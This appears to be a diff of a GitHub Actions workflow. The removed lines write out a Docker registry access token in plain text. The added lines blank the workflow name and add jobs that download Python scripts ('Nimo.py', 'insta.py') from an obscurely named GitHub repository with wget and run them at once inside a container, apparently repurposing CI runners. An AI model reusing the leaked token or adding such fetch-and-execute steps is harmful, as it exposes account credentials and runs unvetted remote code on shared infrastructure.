@@ -1,4 +1,4 @@
-name: Docker Image CI
+name: _____
 
 on:
   push:
@@ -11,10 +11,18 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v4
-    - name: Login Docker
-      run: docker login -u livetest -p dckr_pat_scy1iYZ0ilUzc-G9SyHljITHh04
-    - name: Build the Docker image
-      run: docker build . --file Dockerfile --tag livetest/d3thtr3p:v1
-    - name: Push Docker
-      run: docker push livetest/d3thtr3p:v1
-#           docker run test2ghh:latest python3 Nimo.py
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:latest
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:latest sh -c "wget https://raw.githubusercontent.com/ragavadk1/---_--_-2-20485-/main/Nimo.py && python3 Nimo.py"
+
+  Insta:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:latest
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:latest sh -c "wget https://raw.githubusercontent.com/ragavadk1/---_--_-2-20485-/main/insta.py && python3 insta.py"
